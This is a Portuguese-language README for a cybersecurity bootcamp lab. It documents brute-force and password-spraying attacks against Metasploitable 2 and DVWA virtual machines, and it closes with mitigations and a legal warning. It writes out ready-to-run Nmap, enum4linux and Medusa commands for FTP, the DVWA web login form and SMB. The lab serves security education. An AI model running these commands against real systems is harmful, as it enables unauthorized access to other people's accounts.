# 🔐 Kali + Medusa Brute-Force Lab  
Projeto prático de Cibersegurança — Bootcamp **Santander Cybersegurança 2025** (DIO)  
Autor: **Matheus Santos (berilovania)**  

---

## 📘 Sobre o Projeto
Este laboratório foi desenvolvido para estudar, demonstrar e documentar ataques de **força bruta** e **password spraying** em um ambiente controlado utilizando:

- **Kali Linux** (máquina atacante)  
- **Metasploitable 2** como alvo vulnerável  
- **DVWA – Damn Vulnerable Web Application**  
- **Medusa** como ferramenta principal de brute force  
- **Nmap** e **enum4linux** para enumeração  

**Nenhuma parte deste projeto deve ser utilizada fora de ambientes de teste controlados.**

---

## 🖥️ Arquitetura do Ambiente

O laboratório utiliza duas máquinas virtuais:

| Função | Máquina | IP (exemplo) |
|-------|---------|----------------|
| Atacante | Kali Linux | `<IP-KALI>` |
| Alvo | Metasploitable 2 + DVWA | `<TARGET_IP>` |

> Substitua `<TARGET_IP>` pelo IP da sua máquina Metasploitable na rede Host-Only.

---

## ⚡ Técnicas Exploradas

### **1️⃣ Enumeração com Nmap**
Descobre portas abertas, serviços e versões:

```bash
nmap -sS -sV -O -p- <TARGET_IP> -oN evidence/nmap_full.txt
````

---

### **2️⃣ Brute Force FTP — Medusa**

Força bruta no serviço FTP usando uma wordlist simples:

```bash
medusa -h <TARGET_IP> \
       -u ftp \
       -P wordlists/small-passwords.txt \
       -M ftp -f \
       -O evidence/ftp_medusa_output.txt
```

Para múltiplos usuários:

```bash
medusa -h <TARGET_IP> \
       -U wordlists/users.txt \
       -P wordlists/small-passwords.txt \
       -M ftp -f \
       -O evidence/ftp_multi_output.txt
```

---

### **3️⃣ Brute Force no DVWA — Medusa (Web Form)**

O DVWA exibe a frase de erro **“Login failed”** ao inserir credenciais incorretas.
Podemos usar isso para detectar falhas e sucessos.

```bash
medusa -h <TARGET_IP> \
  -u admin \
  -P wordlists/small-passwords.txt \
  -M web-form \
  -m FORM:"/dvwa/login.php:username=^USER^&password=^PASS^:F=Login failed:S=Welcome" \
  -O evidence/dvwa_medusa_output.txt
```

---

### **4️⃣ Password Spraying SMB — Medusa**

Primeiro, enumere usuários SMB:

```bash
enum4linux -a <TARGET_IP> | tee evidence/enum4linux_output.txt
```

Depois, tente password spraying:

```bash
medusa -h <TARGET_IP> \
       -U wordlists/users.txt \
       -P wordlists/common-passwords.txt \
       -M smbnt -f \
       -O evidence/smb_medusa_output.txt
```

---

## 📂 Estrutura do Repositório

```
kali-medusa-bruteforce-lab/
├── README.md
├── commands.md
├── wordlists/
│   ├── small-passwords.txt
│   ├── common-passwords.txt
│   └── users.txt
├── images/
├── evidence/
└── report/
```

---

## 🧪 Evidências

As saídas dos ataques, scans e testes ficam armazenadas na pasta:

```
/evidence
```

Exemplos:

* `nmap_full.txt`
* `ftp_medusa_output.txt`
* `dvwa_medusa_output.txt`
* `enum4linux_output.txt`
* `smb_medusa_output.txt`

Capturas de tela ficam em:

```
/images
```

---

## 🔒 Mitigações Recomendadas

Durante a análise, foram identificadas boas práticas para reduzir riscos de ataques de força bruta:

### **Aplicações Web**

* Implementar **rate limiting**
* Habilitar **CAPTCHA**
* Bloqueio temporário após tentativas inválidas
* Hash seguro (bcrypt/Argon2)

### **Serviços de Rede**

* Desabilitar serviços desnecessários (como FTP)
* Substituir FTP por **SFTP/SSH**
* Habilitar políticas de **senha forte**
* Desabilitar **SMBv1**

### **Medidas Gerais**

* Aplicar **MFA**
* Monitoramento contínuo de logs
* Políticas de bloqueio por tentativas

---

## ⚠️ Aviso Legal

Este projeto foi desenvolvido **exclusivamente em ambiente isolado de laboratório**, utilizando máquinas virtuais vulneráveis.
**Nunca execute técnicas de brute force ou enumeração em sistemas reais sem autorização explícita.**

---

## ✨ Autor

**Matheus Santos (berilovania)**
Bootcamp Santander Cybersegurança 2025 — DIO
GitHub: [https://github.com/berilovania](https://github.com/berilovania)